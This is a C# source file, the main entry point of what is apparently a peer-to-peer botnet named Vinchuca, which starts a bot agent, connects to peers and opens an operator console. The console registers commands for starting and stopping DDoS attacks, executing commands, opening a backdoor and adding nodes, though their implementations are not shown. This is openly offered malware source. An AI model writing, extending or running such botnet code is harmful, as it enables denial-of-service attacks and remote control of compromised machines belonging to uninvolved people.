using System;
using System.Collections.Generic;
using Mono.Options;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Peers;
using Vinchuca.REPL;
using Vinchuca.Utils;

namespace Vinchuca
{
    public class EntryPoint
    {
        private static Agent agent;

        public static void Main(string[] args)
        {
            var idbuf = new byte[16];
            new Random().NextBytes(idbuf);

            var id = new BotIdentifier(idbuf);
            var listenPort = 33333;
            var peers = new List<PeerInfo>();

            foreach (var arg in args)
            {
                var v = arg.Substring(1);
                switch (arg[0])
                {
                    case 'p':
                        int.TryParse(v, out listenPort);
                        break;
                    case 'c':
                        foreach (var peerInfo in v.Split(new[]{';'}))
                        {
                            peers.Add(PeerInfo.Parse(peerInfo));
                        }
                        break;
                    case 'i':
                        id = BotIdentifier.Parse(v);
                        break;
                }
            }

            agent = new Agent(listenPort, id);
            agent.Run();
            agent.Bootstrap(peers);

            var console = new VirtualConsole(0, 20);
            ConsolesManager.Instance.SetFocus(console);
            Console.SetCursorPosition(0, 21);
            Console.Write(new string('=', Console.BufferWidth));
            var repl = new CommandLineReader(console);

            var suite = new CommandSet("vicha", null, console, console) {
		        "usage: COMMAND [OPTIONS]+.",
                "Available commands are:",
                "",
                // { "v:", "verbosity", (int? v) => Verbosity = v.HasValue ? v.Value : Verbosity+1 },
		        // Commands may also be specified
		        new DDoSStartCommand(agent, repl),
                new DDoSStopCommand(agent, repl),
                new ExecuteCommand(agent, repl),
                new BackdoorCommand(agent, repl),
                new AddNodeCommand(agent, repl),
                new DebugCommand(agent, repl),
                new Command("clear", "Clear the screen")
                {
                    Run = x=>repl.Clear()
                },
                new Command("exit", "Finished the control seesion and close the agent")
                {
                    Run = x=>Environment.Exit(0)
                }
            };

            repl.NewCommand += (sender, eventArgs) => 
                suite.Run(eventArgs.Command.Split(new [] {' '}, StringSplitOptions.RemoveEmptyEntries));
            repl.Run();
        }
    }
}